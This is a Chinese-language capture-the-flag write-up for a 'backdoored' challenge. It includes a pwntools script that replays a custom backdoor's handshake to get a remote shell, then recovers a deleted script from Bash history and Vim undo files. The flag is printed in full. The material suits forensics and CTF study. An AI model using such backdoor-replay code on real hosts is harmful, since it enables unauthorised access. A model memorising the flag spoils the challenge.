# backdoored

## 题目简述

题目描述一台被攻击者通过自定义后门入侵的主机，并提供相关网络交互线索。后门要求先完成十轮固定 8 字节握手，再把服务端发送的 8 字节随机值原样回传；验证通过后可选择读取文件、启动 Shell 或查看系统信息。

进入主机只是第一步。攻击者删除了脚本正文，但 Bash 历史和 Vim 持久化撤销文件保留了操作痕迹，最终 Flag 位于 Vim undo 数据中。

## 解题过程

根据抓包或附件中的客户端代码重放握手。十个常量按小端序发送，每轮等待 `0xef`；随后回显 8 字节 `ball`，最后选择 `0xabcb` 进入 Shell：

```python
from pwn import *

hands = [
    0x124eac80fc0062b2, 0xc5be0fd1d3acaa67,
    0x34dd2228a6a43282, 0x1159339b541e56f1,
    0x70aca735b2bf7e6c, 0x526c90e12ddf390b,
    0x98d85286c110b659, 0x7e1431f33ce72aaa,
    0x5ff07e1e75f088e3, 0x760fe253bef08ed1,
]

p = remote("HOST", PORT)
for value in hands:
    p.send(p64(value))
    p.recvuntil(b"\xef")
ball = p.recvn(8)
p.send(ball)
p.recvuntil(b"\xef")
p.sendline(str(0xabcb).encode())
p.interactive()
```

查看 `~/.bash_history` 可以发现攻击者编辑过 `/tmp/secret/.evil.sh`。当前文件已经被覆盖，但 `~/.vimrc` 开启了：

```vim
set undofile
set undodir=/tmp/.vim/undo
```

因此在 `/tmp/.vim/undo` 定位对应撤销文件，用 Vim 打开原路径并执行 `:earlier` 或 `:undo` 回到被覆盖前的状态。若只做快速证据确认，也可对 undo 文件运行 `strings`，但使用 Vim 恢复能更完整地重建编辑历史。

恢复结果包含：

```text
greyhats{n1c3_w3_g0tt3m_ahahahahahhahaahahha}
```

## 方法总结

- 核心技巧：从抓包重放自定义后门协议，再用 Bash 历史和 Vim 持久化 undo 恢复被删内容。
- 识别信号：历史记录出现 `vim`、目标文件已空、`.vimrc` 明确启用 `undofile` 和自定义 `undodir`。
- 复用要点：命令历史只能说明“做过什么”，编辑器恢复文件才可能保留“原来写了什么”；两类证据要串成完整链条。
